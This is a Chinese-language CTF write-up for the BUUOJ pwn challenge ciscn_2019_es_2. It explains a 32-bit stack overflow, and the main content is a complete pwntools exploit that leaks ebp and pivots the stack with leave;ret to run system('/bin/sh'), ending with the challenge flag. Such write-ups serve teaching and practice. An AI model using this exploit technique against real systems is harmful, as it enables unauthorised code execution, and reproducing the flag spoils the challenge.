# ciscn_2019_es_2

[题目地址](https://buuoj.cn/challenges#ciscn_2019_es_2)

rop基本学的差不多了，现在就差一些小技巧要补充了。正好这题的思路不错。

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

很正常的rop配置。

```c
void vul(void)

{
  undefined local_2c [40];
  
  memset(local_2c,0,0x20);
  read(0,local_2c,0x30);
  printf("Hello, %s\n",local_2c);
  read(0,local_2c,0x30);
  printf("Hello, %s\n",local_2c);
  return;
}
```

ghidra里命名是按变量距离返回地址的大小，因此local_2c离返回地址差0x2c。明显有个栈溢出，读入了0x30的数据。程序准备了一个“后门”函数。

```c
void hack(void)

{
  system("echo flag");
  return;
}
```

最开始我真以为就这么简单，虽然溢出字节不长，但是覆盖个返回地址正好。结果仔细一看这system在这里echo flag，一点用都没有。这题不对劲，给了两个溢出点很奇怪，溢出字节不够长又是个大问题。让我们看看[wp](https://blog.csdn.net/weixin_45743302/article/details/118066603)怎么说。

看了半天总算懂了，对汇编指令不熟卡了好久。先放exp，慢慢解析。

```python
from pwn import *
p=remote('node4.buuoj.cn',26478)
leave_ret=0x080484b8
p.recvline()
payload1=b'a'*0x26+b'b'*2
p.send(payload1)
p.recvuntil('aabb')
ebp=u32(p.recv(4))  
payload2=b'a'*0x4+p32(0x08048400)+b'bbbb'+p32(ebp-0x28)+b'/bin'+b'/sh\x00'
payload2=payload2.ljust(0x28,b'\x00')
payload2+=p32(ebp-0x38)+p32(leave_ret)
p.sendline(payload2)
p.interactive()
```

第一个read的溢出有什么用呢？答案是泄露程序的ebp。之前一直有误解，以为pie没开ebp等一些寄存器的值也是固定的，其实并不是。可以自己动态调试一下，ebp的值每次运行都会不一样，毕竟是程序运行时的栈帧，没法每次都保证在系统中一样。因此我们需要泄露ebp。如何泄露这点不难，printf会打印字符串到\x00结束，我们把原ebp的\x00覆盖掉printf就能帮我们泄露出ebp了。问题在于为什么要泄露？

我们的问题在于可溢出字节不够长。栈溢出长度不足时ROP，可以把栈迁移到别的地方来构造新的ROP链，一般利用leave_ret来进行栈迁移

```
leave
//mov esp ebp  将ebp指向的地址给esp
//pop ebp  将esp指向的地址存放的值赋值给ebp
ret
//pop eip  将esp指向的地址存放的值赋值给eip
```

注释的内容是汇编指令的本质。关键点在于esp指向的内容其实就是返回地址。

```
Welcome, my friend. What's your name?
a
Hello, a

a
Hello, a


Breakpoint 1, 0x080485fe in vul ()
(gdb) i r
eax            0xa                 10
ecx            0xa                 10
edx            0x0                 0
ebx            0xf7f10000          -135200768
esp            0xfff200ec          0xfff200ec
ebp            0xfff200f8          0xfff200f8
esi            0xfff201c4          -917052
edi            0xf7f6cb80          -134820992
eip            0x80485fe           0x80485fe <vul+105>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
(gdb) x/4x $esp
0xfff200ec:     0x0804862a      0x00000001      0xfff20110      0xf7f6d020
```

理论上控制了esp相当于间接控制eip。由于leave，控制ebp相当于控制esp相当于控制eip。那我们控制这些寄存器干啥？当然是调整栈帧了。我们可以修改eip到输入的local_2c的内容中，这样长度绝对够了。这个关键payload看懂了整道题就没问题了。

```python
payload2=b'a'*0x4+p32(0x08048400)+b'bbbb'+p32(ebp-0x28)+b'/bin'+b'/sh\x00'
payload2=payload2.ljust(0x28,b'\x00')
payload2+=p32(ebp-0x38)+p32(leave_ret)
```

从后面开始看。我们把程序的ebp改成了ebp-0x38，这里是local_2c的位置。可能会有疑问，local_2c看着不是ebp-0x28吗？确实是，但是ebp-0x28是一个指针，指向ebp-0x38，我们构建栈肯定要直接在内容上而不是指针傻姑娘运行。p32(leave_ret)是真正溢出到返回地址的值。那么接下来的leave将ebp赋值给esp，现在esp就在local_2c的开头了。之后还有个pop ebp，会把local_2c的前4个字节弹出到ebp中，因此开头的4个a是填充，不让要执行的system函数被弹出到ebp中。

接着ret，也就是pop eip。现在栈已经在local_2c了，leave的pop后接着system地址，顺利把system弹到eip里。接着4个b伪造system执行后的返回地址，正常rop操作。p32(ebp-0x28)就是system的参数/bin/sh。这里乍一看很奇怪，为什么p32(ebp-0x28)后还有个/bin/sh？这是因为当然不能直接把/bin/sh作为system的函数，程序会把它看成地址。ebp-0x28就是输入的payload中/bin/sh的位置，这样参数传ebp-0x28时就引用到了接下来的b'/bin'+b'/sh\x00'。ljust填充paylaod到0x28个字节，为了后面溢出。这样我们就巧妙地利用栈迁移getshell了。

### Flag
- flag{09cf3bd5-2c35-4c07-8cbf-9f2a0542312f}